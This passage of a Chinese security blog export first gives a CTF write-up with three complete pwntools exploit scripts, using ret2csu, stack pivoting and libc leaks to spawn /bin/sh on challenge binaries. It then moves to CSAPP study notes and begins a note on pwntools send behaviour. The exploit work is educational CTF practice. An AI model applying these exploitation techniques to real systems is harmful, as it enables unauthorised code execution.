<p>因此我们这里要用一个巧法，在第一次输入的时候，把syscall的这个地址也给写到bss段，这样bss段的地址就指向了syscall。第二点，还是考虑到字节数的问题，为了构造的payload字节更少，我们在ret2csu第二次执行下面的代码的时候，就不填充成垃圾数据，直接填写成第二次系统调用的参数（如果不这样的话，payload太长了，没法全部输入进去）。</p>
<p><img src="/../img/2706180-20220218172117760-321400513.png"></p>
<p>Exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">pop_rdi_addr=<span class="number">0x4007f3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;pid&#x27;</span>+<span class="built_in">str</span>(proc.pidof(p)))</span><br><span class="line">offset=<span class="number">0x60</span></span><br><span class="line">syscall_addr=<span class="number">0x40077E</span></span><br><span class="line">write_addr=<span class="number">0x400773</span></span><br><span class="line">csu_gadget1=<span class="number">0x4007EA</span></span><br><span class="line">csu_gadget2=<span class="number">0x4007D0</span></span><br><span class="line">term_proc=<span class="number">0x600e50</span></span><br><span class="line">bss_addr=<span class="number">0x601060</span></span><br><span class="line">payload=(offset+<span class="number">8</span>)*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(csu_gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>) <span class="comment">#rbx</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">payload+=p64(term_proc)<span class="comment">#r12 空函数#第一次ret2csu的目的是传read函数参数，并且在最后的ret去执行系统调用，第一次不需要用到call，因此call一个空函数</span></span><br><span class="line">payload+=p64(<span class="number">59</span>)<span class="comment">#r13 rdx #执行一次syscall之后，rax就变成了0x3b</span></span><br><span class="line">payload+=p64(bss_addr)<span class="comment">#r14  #rsi  #将/bin/sh写入bss段</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r15  #rdi</span></span><br><span class="line">payload+=p64(csu_gadget2)</span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span><span class="comment">#下面的48个数据不用垃圾填充，直接进行下一轮涉及参数，这8个垃圾数据填充的是add rsp,8</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x8</span>)<span class="comment">#此时用call来执行输入到bss段里的syscall</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">payload+=p64(syscall_addr)</span><br><span class="line">payload+=p64(csu_gadget2)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Welcome to VNCTF! This is a easy competition.///\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(syscall_addr)+<span class="string">&#x27;\x00&#x27;</span>.ljust(<span class="number">59</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#这里一定要凑齐59，使得read函数的返回值，也就是让rax变成59</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="BUUCTF上的ciscn-2019-es-7"><a href="#BUUCTF上的ciscn-2019-es-7" class="headerlink" title="BUUCTF上的ciscn_2019_es_7"></a>BUUCTF上的ciscn_2019_es_7</h3><p><img src="/../img/2706180-20220218171807039-876069338.png"></p>
<p><img src="/../img/2706180-20220218171817015-1156769220.png"></p>
<p>发现程序流程就是两个系统调用，一个是read，一个是write。</p>
<p><img src="/../img/2706180-20220218171824552-2132934623.png"></p>
<p>同时发现了这里改变了rax的值，改成了0x3b，也就系统调用execve函数。</p>
<p>发现只能控制rdi的值，而不能控制rsi,rdx的值</p>
<p><img src="/../img/2706180-20220218171833959-1096288017.png"></p>
<p>那思路就出来了。</p>
<p>我们利用ret2csu控制rsi和rdx参数，最后执行Mov rax,0x3b；syscall即可。</p>
<p>那只有一个问题了，也是这道题的难点，怎么把rdi存入参数的地址。</p>
<p>我最开始想的是执行一个ret2csu去把参数给写进bss段，可是我们由于控制不了rax的值，就没办法系统调用号设置成0,。</p>
<p>那bss段写不了，只能写入程序给我们指定的地方了，可是这就意味着我们需要泄露栈中地址。以前只遇见过程序自己泄露一个栈的地址的，这道题也算是长见识了，见了一种新方法。</p>
<p>系统调用write的时候，<br><img src="/../img/2706180-20220218171846029-2137483481.png"></p>
<p>第三个参数是0x30，可是我们发现<br><img src="/../img/2706180-20220218171854501-342656814.png"></p>
<p>Buf距离栈底仅仅有十个字节。因此write是可以打印出来栈中内容的。并且我们运行程序也可以发现是有端倪的。</p>
<p><img src="/../img/2706180-20220218171903218-1711747126.png"></p>
<p>不仅仅打印出来了我们输入的东西，还打印出来了一些乱码。</p>
<p>我们先简单写一个脚本</p>
<p><img src="/../img/2706180-20220218171915304-1425594620.png"></p>
<p>这个脚本就是发送一个1，但是可以看见我们接收的内容。</p>
<p><img src="/../img/2706180-20220218171922519-1774565205.png"></p>
<p>此时可以看见我们已经泄露出来了栈的内容。</p>
<p>我们用gdb看一下</p>
<p><img src="/../img/2706180-20220218171929967-1280624006.png"></p>
<p>泄露的内容是红线的部分（当然由于只能泄露0x30个字节，我红线圈多了，但是我想强调的是栈地址泄露，泄露的是内容，而非栈的地址）</p>
<p>不过我们发现了第一个和第三个泄露的栈中的内容是指向了栈的地址，这样我们就可以用泄露的栈的内容配合偏移，来获取栈的地址了。</p>
<p>经过调试发现，vul函数的返回地址就是此时栈顶的，我们是要劫持程序的执行流，因此第一个地址肯定是没法泄露了，我们来泄露第三个栈的内容。然后把返回地址填写成vul函数的首地址，让程序再执行一次（去进行ret2csu）</p>
<p>拿到栈中第三个内容后，看一下它距离我们输入的内容的首地址偏移是多少。<br><img src="/../img/2706180-20220218171939424-200600591.png"></p>
<p>F088是泄露的地址，df70是输入存储的首地址（我打算把&#x2F;bin&#x2F;sh输入到这个地方）</p>
<p>然后就没什么了，偏移拿到之后，就可以写exp了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28000</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">csu_gadget1=<span class="number">0x40059A</span></span><br><span class="line">modify_rax=<span class="number">0x4004E2</span></span><br><span class="line">csu_gadget2=<span class="number">0x400580</span></span><br><span class="line">term_proc=<span class="number">0x600e50</span> <span class="comment">#这个地址并不是term_proc的地址，而是指向term_proc的地址</span></span><br><span class="line">bss_addr=<span class="number">0x601030</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x4005a3</span></span><br><span class="line">syscall_addr=<span class="number">0x400517</span></span><br><span class="line">read_syscall=<span class="number">0x4004ED</span></span><br><span class="line">offset=<span class="number">16</span></span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(read_syscall)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x05\x40\x00\x00\x00\x00\x00&#x27;</span>) <span class="comment">#这个用来筛选一下我们要找的数据</span></span><br><span class="line">leak_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">bin_sh_addr=leak_addr-<span class="number">280</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(csu_gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(term_proc)  <span class="comment">#此时call一个空函数，我们用ret来劫持执行流</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#r13 r14 r15</span></span><br><span class="line">payload+=p64(csu_gadget2)</span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">56</span></span><br><span class="line">payload+=p64(modify_rax)</span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(bin_sh_addr) <span class="comment">#把参数放到rdi里面</span></span><br><span class="line">payload+=p64(syscall_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="BUUCTF上的gyctf-2020-borrowstack"><a href="#BUUCTF上的gyctf-2020-borrowstack" class="headerlink" title="BUUCTF上的gyctf_2020_borrowstack"></a>BUUCTF上的gyctf_2020_borrowstack</h3><p>这道题，我已经在栈迁移的那篇博客中发过了，这篇里面我就展示一下WP吧，具体细节可以看一下栈迁移的那篇博客。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_plt_addr=e.got[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#why got here </span></span><br><span class="line"><span class="comment">#call函数为跳转到某地址内所保存的地址，应该使用got表中的地址</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x400703</span></span><br><span class="line">level_addr=<span class="number">0x400699</span></span><br><span class="line">bss_addr=<span class="number">0x601080</span></span><br><span class="line">ret_csu_addr=<span class="number">0x4006FA</span></span><br><span class="line">rsi_addr=<span class="number">0x601118</span></span><br><span class="line">payload1=<span class="number">0x60</span>*<span class="string">&#x27;a&#x27;</span>+p64(bss_addr+<span class="number">0x40</span>)+p64(level_addr)<span class="comment">#这里多加0x40的目的就是为了执行puts的时候，不影响之前的got表中的数据</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;u want\n&#x27;</span>,payload1)</span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(pop_rdi_addr)+p64(puts_got_addr)+p64(puts_plt_addr)</span><br><span class="line">payload2+=p64(ret_csu_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(read_plt_addr)+p64(<span class="number">0x100</span>)</span><br><span class="line">payload2+=p64(rsi_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0x4006E0</span>)<span class="comment">#why is there an address here</span></span><br><span class="line"><span class="comment">#这一个4006E0仅仅是ret2csu执行了pop之后的ret的返回的地址。</span></span><br><span class="line"><span class="comment">#至于怎么返回到one_gadget上的，是因为read的返回地址被read自己给改了</span></span><br><span class="line"><span class="comment">#payload2中的第一个p64(0)是去占个地方，因为栈迁移本身的特性，迁移后的第一个内存单元不执行</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;k now!\n&#x27;</span>,payload2)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f432</span></span><br><span class="line">p.sendline(p64(one_gadget))<span class="comment">#why p64 here #只要是发送地址 就要经过打包之后发送</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/../img/2706180-20220416083237696-1901804155.png"></p>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>re2csu</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-第一章 计算机系统漫游（笔记）</title>
    <url>/posts/6329566d.html</url>
    <content><![CDATA[<p>​	这个第一章，主要是介绍了计算机上的一些专业术语，以及一些最基础的概念（并没有深入讲解，不过会在后面的章节进行探究）。<strong>不过这些概念彼此之间联系不大，并不是循序渐进的，因此这一章，我单独介绍里面出现的术语</strong>。</p>
<span id="more"></span>

<h1 id="计算机系统是个啥？操作系统又是个啥？"><a href="#计算机系统是个啥？操作系统又是个啥？" class="headerlink" title="计算机系统是个啥？操作系统又是个啥？"></a>计算机系统是个啥？操作系统又是个啥？</h1><p>​	这一章的名字叫做计算机系统漫游，别的不说，就光看名字，这个计算机系统是什么？我们平常提到的操作系统又是啥，怎么去理解它？</p>
<h2 id="计算机系统是什么？"><a href="#计算机系统是什么？" class="headerlink" title="计算机系统是什么？"></a>计算机系统是什么？</h2><p>​	这个<strong>计算机系统</strong>啊，其实第一章的第一句话就给出定义了，<strong>它是由硬件和系统软件组成的</strong>，他们共同工作来运行应用程序。其实这就是一个很大的范围，<strong>就可以简单理解为计算机系统就是包括了软件系统和硬件系统</strong>。</p>
<h2 id="操作系统是什么？"><a href="#操作系统是什么？" class="headerlink" title="操作系统是什么？"></a>操作系统是什么？</h2><p>​	这个操作系统其实没有计算机系统那么抽象，<strong>你完全可以把它理解成一个软件</strong>（CSAPP中提到我们可以把操作系统看成是应用程序与硬件之间插入的一层软件），<u>只不过这个软件相比于其他软件不同之处在于可以去管理计算机的硬件以及计算机的资源</u>。它存在的意义就是去为了更方便用户来控制我们的电脑。<em>操作系统位于底层硬件与用户之间，是两者沟通的桥梁。用户可以通过操作系统的用户界面，输入命令。操作系统则对命令进行解释，驱动硬件设备，实现用户要求。</em></p>
<h2 id="现在知道了操作系统的概念，那我们平常提到的32位和64位操作系统又是个什么玩意？"><a href="#现在知道了操作系统的概念，那我们平常提到的32位和64位操作系统又是个什么玩意？" class="headerlink" title="现在知道了操作系统的概念，那我们平常提到的32位和64位操作系统又是个什么玩意？"></a>现在知道了操作系统的概念，那我们平常提到的32位和64位操作系统又是个什么玩意？</h2><p>​	这里我以64位程序为例，这个64位的这个单位其实是Bit(比特)，而一个比特呢，就是我们所说的二进制中的一个0或1。为什么正好是64位比特呢，这是因为我们使用的这个CPU，一次性处理的就是64个比特的数据（你可以姑且这么理解），但事实上一次处理64个比特的数据并不全是CPU的意思。其实这跟总线也有一部分关系，在书中的原话是这样描述总线的。</p>
<blockquote>
<p>​	贯穿整个系统的是一组电子管道，称作总线，它携带信息字节并负责在各个部件间传递。通常总线被设计成传送定长的字节块，也就是字（word）。字中的字节数（即字长）是一 个基本的系统参数，各个系统中都不尽相同。现在的大多数机器字长要么是4个字节（32 位），要么是8个字节（64位）。</p>
</blockquote>
<p>​	由此可以看出，是传输信息的时候，就已经把这些信息给划分成了固定的长度。就比如64位程序，那它传输的数据，就是把64个比特划分成了一个定长，然后传输给CPU。毕竟接收的数据都是64位比特位一组了，那处理起来，自然也要是64位比特为一组。看一下书中怎么介绍CPU的</p>
<p><em>处理</em>器</p>
<blockquote>
<p><em>中央处理单元（CPU）,简称处理器，是解释（或执行）存储在主存中指令的引擎。处理器的核心是一个大小为一个字的存储设备（或寄存器），称为程序计数器（PC）。在任何时刻，PC都指向主存中的某条机器语言指令（即含有该条指令的地址）。</em><br>   <u>从系统通电开始，直到系统断电，处理器一直在不断地执行程序计数器指向的指令, 再更新程序计数器，使其指向下一条指令</u>在这个模型中，指令按照严格的顺序执行，而执行一条指令包含执行一系列的步骤。处理器从程序计数器指向的内存处读取指令，解释指令中的位，执行该指令指示的简单操作，然后更新PC,使其指向下一条指令, 而这条指令并不一定和在内存中刚刚执行的指令相邻。*</p>
</blockquote>
<p>​	<strong>可以看到CPU和总线在设计的时候，都被刻意设置成了一次处理或传输一个字。而这个字的大小就决定了这个程序是个32位的还是64位的。</strong></p>
<p>程序编译成可执行文件的四个阶段</p>
<p>一个程序刚写完的时候，它其实是这样的。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304171313301.png" alt="image-20230417131308240"></p>
<p>但此时它并不是我们最终要的ELF（Linux下的可执行文件）程序，需要经过编译之后，才能变成我们能够执行的ELF文件（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304171313433.png" alt="image-20230417131335367"></p>
<p>此时单单看大小，你应该就会产生一个疑问，刚写完的时候，大小是70字节，结果编译成了可执行文件，咋就成了8.2KB，大小直接翻了将近120倍，为什么会这样？</p>
<p>这时候我们就要聊聊这个程序被编译成ELF文件的四个阶段了。</p>
<h2 id="1、预处理阶段"><a href="#1、预处理阶段" class="headerlink" title="1、预处理阶段"></a>1、预处理阶段</h2><p>这个阶段最主要的事情，就是把#后面的内容去用代码替换掉，就比如#include&lt;stdio.h&gt;这句话，在预处理阶段，这句话会消失，取而代之的是很长的代码。我们先写一个hello world源文件，然后用gcc -E hello.c去编译一下。</p>
<p><img src="/../img/2706180-20220215105925287-2109179106.png"></p>
<p>可以发现，原本的#include&lt;stdio.h&gt;没了，变成了一些代码（这张图片没有展示完全，因为代码太多了，就截取了一小部分）不过我们写的main函数的代码还在。</p>
<h2 id="2、编译阶段"><a href="#2、编译阶段" class="headerlink" title="2、编译阶段"></a>2、编译阶段</h2><p>这个阶段就是通过编译器，把我们写的c的高级语言代码变成了汇编指令。通过gcc -S hello.c命令可以编译出来hello.s文件。</p>
<p><img src="/../img/2706180-20220215105929045-624871612.png"></p>
<h2 id="3、汇编阶段"><a href="#3、汇编阶段" class="headerlink" title="3、汇编阶段"></a>3、汇编阶段</h2><p>汇编阶段就是把上个阶段得到的汇编指令给翻译成机器语言指令（就是二进制指令），也就是说此时经过了汇编阶段后，我们再查看编译得到的文件，得到的就全都是乱码了。用gcc -c hello.c命令去编译。此时的文件也就是目标文件（被编译好了，不过还没有进行链接的文件）</p>
<p><img src="/../img/2706180-20220215105932332-2146993747.png"></p>
<h2 id="4、链接阶段"><a href="#4、链接阶段" class="headerlink" title="4、链接阶段"></a>4、链接阶段</h2><p>就比如这个最简单的hello world的程序，你有没有想过，凭什么printf函数它就可以去打印。其实奥秘就在这个链接阶段，这个printf函数的背后也是有很多的代码（绝不是你表面上看起来的printf()这一个单词）只不过这个printf函数的代码已经提前被写好了，并且也被打包成了一个目标文件。因此在链接阶段只需要将需要的目标文件都合并到一起，就成为了最后的ELF文件。</p>
<h2 id="编译系统"><a href="#编译系统" class="headerlink" title="编译系统"></a>编译系统</h2><p>最后可以看一下整体的过程，如下图。并且执行这四个阶段的程序（预处理器、编译器、汇编器和链接器）一起构成了编译系统</p>
<p><img src="/../img/2706180-20220215110251028-1658054176.png"></p>
<h1 id="什么是shell"><a href="#什么是shell" class="headerlink" title="什么是shell"></a>什么是shell</h1><p>shell本质上就是个程序，不过我通常把它理解为终端。事实上shell只是一个命令行解释器（这个解释的更好一些）（也就意味着其实它并不包括可视化界面，不过你把它理解成终端也没什么问题的）（具体介绍的话，书中已经详细写了，这里就不再赘述了）<br><img src="/../img/2706180-20220215105936187-1610462697.png"></p>
<h1 id="虚拟内存-amp-amp-高速缓存-amp-amp-主存"><a href="#虚拟内存-amp-amp-高速缓存-amp-amp-主存" class="headerlink" title="虚拟内存&amp;&amp;高速缓存&amp;&amp;主存"></a>虚拟内存&amp;&amp;高速缓存&amp;&amp;主存</h1><p>这里我只是先简单介绍一下这三者，在以后的笔记中，会详细讨论他们三个。</p>
<h2 id="1、先谈谈主存"><a href="#1、先谈谈主存" class="headerlink" title="1、先谈谈主存"></a>1、先谈谈主存</h2><pre><code>    首先主存就是内存，这俩是一回事。当一个程序运行的时候，这个程序就会被加载到内存里面，以便CPU进行数据处理，简单来说内存就是用于暂时存放CPU中的运算数据。在书中强调说，主存是一个临时存储设备，为什么这是个临时的呢？因为它通电才会进行存储，断电后内存中的数据就会消失。

    如果单听解释太抽象的话，这里来举两个例子。如果你在用word写一个文档，你在敲击每一个字到word中的时候，此时它们是存储到了内存中，如果你点击了保存，那么它们才存到了磁盘中。如果你开了一局游戏，此时这个游戏其实就是在内存中进行。
</code></pre>
<p><em>从逻辑上来说，存储器是一个线性的字节数组，每个字节都有其唯一的地址（数组索引），这些地址是从零开始的。</em></p>
<p>从书中的这句话，我们可以知道其实这个存储器，就可以把它理解为一个旅馆，其中有一个一个的小房间，每个房间都是有一个唯一的号码。</p>
<p>此时问题就来了，我们如果开了两个游戏呢，我们知道一个游戏，是一个进程，这个进程对应着自己的内存，可是如果两个进程呢，或者更多个进程呢？我们有那么多内存去分配给他们么？此时我们引入了虚拟内存这个概念。</p>
<h2 id="2、虚拟内存"><a href="#2、虚拟内存" class="headerlink" title="2、虚拟内存"></a>2、虚拟内存</h2><p>虚拟内存细了讲是有很多东西的，这里简单解释一下。虚拟内存出现的其中一个目的就是去解决我上面说的那个问题（去“创造”出来更多的内存来供我们使用）这里的创造，我加了引号，事实上它并不是创造，而更像是一种欺骗，<strong>一个叫做MMU的东西，去欺骗了每个进程，当每个进程准备提供给CPU数据的时候，MMU才会把那些数据放到内存里面，不然的话，那些不用的数据时一直存放在磁盘中（这样真正的内存存储的都是与CPU即将交换的数据，这样就类似于“创造”了更多的内存）</strong>。不过进程本身是不知道这件事情的，进程一直以为自己是独占了整个内存的使用。</p>
<h2 id="3、高速缓存"><a href="#3、高速缓存" class="headerlink" title="3、高速缓存"></a>3、高速缓存</h2><p><strong>这个高速缓存其实就是比内存传输数据更快的东西。</strong>传输数据最快的是寄存器，因为寄存器本身就在CPU上，然后就是高速缓存，接着是内存，最后是外存。越往后传输速度越慢，但是存储的内容更多。</p>
<p><img src="/../img/2706180-20220215105940453-1971369963.png"></p>
<p>缓存也没什么好说的，主要是原文已经写的很明白了。最后就是高速缓存的目的就是去提升计算机系统的处理速度。</p>
<h1 id="什么是进程和线程？"><a href="#什么是进程和线程？" class="headerlink" title="什么是进程和线程？"></a>什么是进程和线程？</h1><h2 id="1、进程"><a href="#1、进程" class="headerlink" title="1、进程"></a>1、进程</h2><p>写好的程序，它是放在磁盘上的，如果我们去运行它，ok，它就变成了进程。<strong>可以说被运行的程序就是进程</strong>。既然是被运行了，那进程肯定是在内存中的。下面是进程在内存中的布局。</p>
<p><img src="/../img/2706180-20220215105944333-1401735974.png"></p>
<p>现在我们只要初步了解一下进程即可。<u>并且进程彼此独立互不干扰的；另外每个进程都认为自己是在独占着CPU，但事实上我们系统中一定不是就一个进程，因此在实际的进程切换中，就会进行上下文切换（这个上下文就是一种状态，例如PC和寄存器文件的当前值等等），保存当前上下文，恢复新进程的上下文。</u></p>
<h2 id="2、线程"><a href="#2、线程" class="headerlink" title="2、线程"></a>2、线程</h2><p> <em><strong>线程是操作系统能够进行运算调度的最小单位。它被包含在进程之中</strong>，是进程中的实际运作单位。一条线程指的是进程中一个单一顺序的控制流，一个进程中可以并发多个线程，每条线程并行执行不同的任务。</em></p>
<p>进程之间是彼此独立的，<u>而线程只要是所属于一个进程之下，那他们之间就可以共享一个进程的资源以及地址空间。并且多个线程可以读写同一快内存</u>。<strong>由于进程彼此是独立的，在安全性上略胜一筹，而多个线程是可以读写同一个内存，因此在速度上有优势。</strong></p>
<h1 id="什么是I-x2F-O"><a href="#什么是I-x2F-O" class="headerlink" title="什么是I&#x2F;O"></a>什么是I&#x2F;O</h1><p>我最早的时候，经常看到网上的文章说I&#x2F;O，但是一直不理解，其实它没什么好神秘的，**I&#x2F;O的意思就是输入（Input)和输出(Output)**，只要具有输入输出类型的交互系统都可以认为是I&#x2F;O系统。<u>就比如我们的键盘和鼠标就是输入设备，而显示器则是输出设备，甚至磁盘也是输出设备（尽管这个我们看不见，但是数据确实是被输出到了磁盘中）</u>，每个I&#x2F;O设备都是通过一个控制器或适配器与I&#x2F;O总线相连。</p>
<h1 id="什么是文件"><a href="#什么是文件" class="headerlink" title="什么是文件"></a>什么是文件</h1><p><strong>文件就是字节序列（字节序列可能有点抽象，简单来说，就是很多个字节集合放到了一起）</strong>，并且在linux中，万物皆为文件（包括磁盘、键盘、显示器等等）。</p>
<h1 id="平常说的CPU到底是个啥"><a href="#平常说的CPU到底是个啥" class="headerlink" title="平常说的CPU到底是个啥"></a>平常说的CPU到底是个啥</h1><p><strong>CPU是指中央处理器，通俗来讲就是读取指令然后执行然后再读取，用不停歇直到断电</strong>。它作为计算机系统的运算和控制核心，是信息处理、程序运行的最终执行单元。CPU里面分为三个很重要的部分，分别是ALU（算术逻辑单元），寄存器组，控制单元。</p>
<h2 id="ALU"><a href="#ALU" class="headerlink" title="ALU"></a>ALU</h2><p>是CPU的核心，因为它是负责计算的</p>
<h2 id="寄存器组"><a href="#寄存器组" class="headerlink" title="寄存器组"></a>寄存器组</h2><p>实质上就是CPU中暂时存放数据的地方，里面保存着等待处理和处理过的数据。</p>
<h2 id="控制单元"><a href="#控制单元" class="headerlink" title="控制单元"></a>控制单元</h2><p>简单来说，控制单元就是来指挥CPU内部的工作的。</p>
<h1 id="并发和并行-amp-amp-超线程"><a href="#并发和并行-amp-amp-超线程" class="headerlink" title="并发和并行&amp;&amp;超线程"></a>并发和并行&amp;&amp;超线程</h1><p>简单来说，并发就是两个事件或多个事件在一个时间依次发生；而并行则是两个时间或多个事件在一个时间同时发生。</p>
<h2 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h2><p>我们知道如果只有一个CPU的话，那么它在某一时刻也只能执行一个线程，因此它要执行多个线程，就只能把时间分成若干段，然后把每一段时间分别分配给每个线程。在某一时刻线程代码在运行时，其他线程是处于挂起状态。</p>
<h2 id="并行"><a href="#并行" class="headerlink" title="并行"></a>并行</h2><p>可如果我们拥有了多个CPU，那每一个CPU都可以在一个时刻去处理一个线程，从而系统在操作的时候，就可以同时处理多个线程（且线程之间互不抢占CPU的资源），这就是并行。</p>
<p>可是即使只有一个CPU，在用户看来，系统似乎还是可以同时处理多个线程，那是因为CPU处理的速度是在太快了，使多个线程快速交替进行，从而给人的感觉是在同一个时间处理了多个线程。</p>
<h2 id="超线程"><a href="#超线程" class="headerlink" title="超线程"></a>超线程</h2><p>如果理解了前面的并行之后，超线程（有时也被称为多线程）就不难理解了，它可以让一个CPU能够到达线程级并行计算。大概是通过备份一些CPU的硬件，比如寄存器文件和程序计数器等等，尽管此时的CPU可以同时处理两个线程，但除去刚才提到的寄存器文件和程序计数器，其他硬件依然是被共享的。</p>
<p>参考文章 <a href="https://www.zhihu.com/question/497245883">https://www.zhihu.com/question/497245883</a><br>图片链接 <a href="https://www.php.cn/faq/422175.html">https://www.php.cn/faq/422175.html</a></p>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>探究pwntools中sendline的回车所造成的影响（什么时候用sendline，什么时候用send）</title>
    <url>/posts/9fda4edb.html</url>
    <content><![CDATA[<p>在pwntools中，sendline和send都是发送数据，但是sendline是发送一行数据，换句话说就是sendline会在发送的数据末尾加一个回车。而<strong>这个回车所造成的影响，是跟对应的输入函数有关系</strong>，在做pwn题中，碰见的输入函数有scanf（”%s”)，gets()，read()，fgets(),这四个函数。我感觉最常见的应该是read函数。<strong>我们分别讨论一下这前三个函数在读取内容上的具体细节以及sendline所造成的影响</strong>。</p>
<span id="more"></span>

<h1 id="read函数"><a href="#read函数" class="headerlink" title="read函数"></a>read函数</h1><p><u>read(fd, buf,  count) fd是文件描述符，你可以通俗理解为从哪读；buf是一个指针，你可以理解为读到哪，count就是读入字符的数量。</u></p>
<p><font color=red><em><strong>read的内容都是从缓冲区中读取的</strong></em></font><br>如果read的fd是0，也就是说read的内容，都要从输入的缓冲区中读取。（0在文件描述符中代表着标准输入）这里要注意，<strong>读取的内容不是直接被输入到了指定的地方，而是不管你输入了多少内容，即使超过了count的限制，</strong><font color=red><strong>也依旧输入到了输入缓冲区中</strong></font><br>只是read函数没有把输入缓冲区中超过count限制的后面的内容读到指定的buf而已，<strong>也就是说此时输入缓冲区里面依然存在多余的内容。</strong>同样，<font color=red><em>也就是说如果你输入的内容是伴随着你按下回车结束，并且此时输入内容的长度还小于read函数的count那么这个回车也会被读取到read指定的第二个参数中</em></font></p>
